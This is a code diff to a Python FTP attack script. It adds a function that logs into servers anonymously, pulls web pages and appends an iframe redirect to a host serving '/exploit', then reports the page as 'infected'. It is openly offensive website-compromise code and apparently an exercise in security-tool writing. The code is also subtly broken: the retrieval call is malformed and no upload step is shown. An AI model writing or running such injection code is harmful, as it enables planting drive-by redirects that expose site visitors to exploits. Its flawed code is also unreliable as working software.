@@ -1,6 +1,8 @@
 import ftplib
 import optparse
 
+MALICIOUS_SERVER = '192.168.1.154:8000/exploit'
+
 def loginWithAnonymous(host):
 
     try:
@@ -49,6 +51,16 @@ def directoryListing(ftpConnection):
             webFiles.append(file)
 
     return webFiles
+
+def maliciousInjection(ftpConnection, page):
+    temporaryInjectionFile = open(page + '.tmp', 'w')
+
+    ftpConnection.retrlines('RETR' + page, temporaryInjectionFile.write())
+
+    temporaryInjectionFile.write('<iframe src=' + MALICIOUS_SERVER + '></iframe>')
+    temporaryInjectionFile.close()
+
+    print("[+] Successfully Injected Malicious Redirect into FTP Server at Page: {infected}".format(infected=page))
 
 
 def main():
